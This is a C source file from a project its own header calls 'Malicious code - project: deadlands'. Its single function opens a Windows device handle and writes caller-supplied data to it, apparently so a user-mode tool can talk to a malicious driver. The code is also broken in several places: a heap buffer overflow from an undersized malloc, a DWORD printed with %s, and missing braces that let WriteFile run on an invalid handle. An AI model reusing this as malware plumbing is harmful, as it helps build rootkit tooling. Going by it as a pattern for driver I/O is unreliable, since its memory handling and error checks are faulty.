/*
** Malicious code - project: deadlands
** Filename: SendDriverData.c
*/

#include <windows.h>
#include <stdio.h>
#include "service.h"

int                 SendDriverData(char **args)
{
	HANDLE			hFile;
    DWORD           dwReturn;
    INT32           len;
    char          *name;
    
    len = strlen(args[0]) + strlen("\\\\.\\");
    name = malloc(sizeof(*name) * len);
    strcat(strcpy(name, "\\\\.\\"), args[0]);
    
    hFile = CreateFile(name,
     GENERIC_READ | GENERIC_WRITE,
     0,
     NULL,
     OPEN_EXISTING,
     0,
     NULL);
    if (hFile == INVALID_HANDLE_VALUE)
       printf("[ERROR]: Can't create service (%s)\n", GetLastError());
       printf("name:%s args ===> %s\n", name, args[1]);
    WriteFile(hFile, args[1], strlen(args[1]), &dwReturn, NULL);
    CloseHandle(hFile);
   	return (0);
}

